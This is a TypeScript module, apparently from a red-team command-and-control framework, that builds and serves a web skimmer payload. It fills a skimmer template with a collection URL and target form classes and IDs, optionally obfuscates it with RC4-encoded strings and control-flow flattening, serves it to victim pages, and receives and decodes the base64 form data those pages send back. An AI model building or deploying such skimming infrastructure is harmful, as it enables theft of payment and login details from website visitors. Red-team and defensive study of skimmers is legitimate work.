import { Request, Response } from "express";
import * as fs from "fs";
import { obfuscate, ObfuscationResult } from "javascript-obfuscator";
import Logger from "../lib/logger";

import { emsg } from "../utils";
import { Module } from "./base";
import { RedChannelConfig } from "../lib/config";

const SKIMMER_PAYLOAD_TEMPLATE_PATH = "payloads/skimmer.js";

export default class SkimmerModule implements Module {
    payload: string;
    log: Logger;

    constructor(protected config: RedChannelConfig, log?: Logger) {
        this.payload = "";
        this.log = log ?? new Logger();

        // this.defineCommands({
        //     generate: {
        //         arguments: [],
        //         description: "generate skimmer payload with the specified url and target classes and ids",
        //         execute: this.run,
        //     },
        //     payload: {
        //         arguments: [],
        //         description: "get the current generated payload",
        //         execute: () => {
        //             return { message: this.payload };
        //         },
        //     },
        //     "set url": {
        //         arguments: ["<url>"],
        //         description: "set the external skimmer c2 url (http://skimmer.url)",
        //         validateRegex: Constants.VALID_URL_REGEX,
        //         execute: (params: string) => {
        //             this.config.skimmer.url = params;
        //         },
        //     },
        //     "set obfuscate_payload": {
        //         arguments: ["<1|0>"],
        //         description: "enable or disable payload obfuscation",
        //         execute: (params: string) => {
        //             this.config.skimmer.obfuscate_payload = params !== "0" && params !== "false" ? true : false;
        //         },
        //     },
        //     "set data_route": {
        //         arguments: ["<route>"],
        //         description: "set the skimmer url data route (/stats)",
        //         validateRegex: Constants.VALID_ROUTE_REGEX,
        //         execute: (params: string) => {
        //             this.config.skimmer.data_route = params;
        //         },
        //     },
        //     "set target_classes": {
        //         arguments: ["<class 1,class 2,class 3>"],
        //         description: "(optional) target classes with skimmer click handler, separated by comma",
        //         validateRegex: Constants.VALID_CLASS_ID_REGEX,
        //         execute: (params: string) => {
        //             const classes = params.split(",");
        //             this.config.skimmer.target_classes = [...new Set(classes)];
        //         },
        //     },
        //     "set target_ids": {
        //         arguments: ["<id 1,id 2,id 3>"],
        //         description: "(optional) target ids with skimmer click handler, separated by comma",
        //         validateRegex: Constants.VALID_CLASS_ID_REGEX,
        //         execute: (params: string) => {
        //             const ids = params.split(",");
        //             this.config.skimmer.target_ids = [...new Set(ids)];
        //         },
        //     },
        // });
    }

    run(): void {
        if (!this.config.skimmer.url) throw new Error("skimmer url is required, see 'help'");

        let data: Buffer;
        let skimmerJs = "";
        try {
            data = fs.readFileSync(SKIMMER_PAYLOAD_TEMPLATE_PATH);
            skimmerJs = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        const targetClasses = "['" + this.config.skimmer.target_classes.join("','") + "']";
        const targetIds = "['" + this.config.skimmer.target_ids.join("','") + "']";
        const targetUrl = this.config.skimmer.url;
        const targetDataRoute = this.config.skimmer.data_route;

        skimmerJs = skimmerJs.replace(/\[SKIMMER_URL\]/, targetUrl);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_DATA_ROUTE\]/, targetDataRoute);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_CLASSES\]/, targetClasses);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_IDS\]/, targetIds);
        skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");

        this.payload = skimmerJs;
        if (this.config.skimmer.obfuscate_payload) {
            let obfs: ObfuscationResult;
            try {
                obfs = obfuscate(skimmerJs, {
                    compact: true,
                    controlFlowFlattening: true,
                    transformObjectKeys: true,
                    log: false,
                    renameGlobals: true,
                    stringArray: true,
                    stringArrayEncoding: ["rc4"],
                    identifierNamesGenerator: "mangled",
                });
                this.payload = obfs.getObfuscatedCode();
            } catch (ex) {
                throw new Error(`failed to obfuscate js payload: ${emsg(ex)}`);
            }
        }

        this.log.info(`skimmer payload set to: \n${this.payload}`);
    }

    dataRouteHandler(request: Request, response: Response) {
        this.log.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);

        if (request.query?.id) {
            const skimmerId = request.query.id as string;
            const decodedData = Buffer.from(skimmerId, "base64").toString();
            this.log.success(`incoming skimmer data:\n${decodedData}`);
        } else {
            this.log.warn(`incoming skimmer data did not have an id`);
        }

        response.send();
    }
    payloadRouteHandler(request: Request, response: Response) {
        const ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
        this.log.warn(`incoming request for skimmer payload from ${ip}`);

        response.send(this.payload);
    }
}
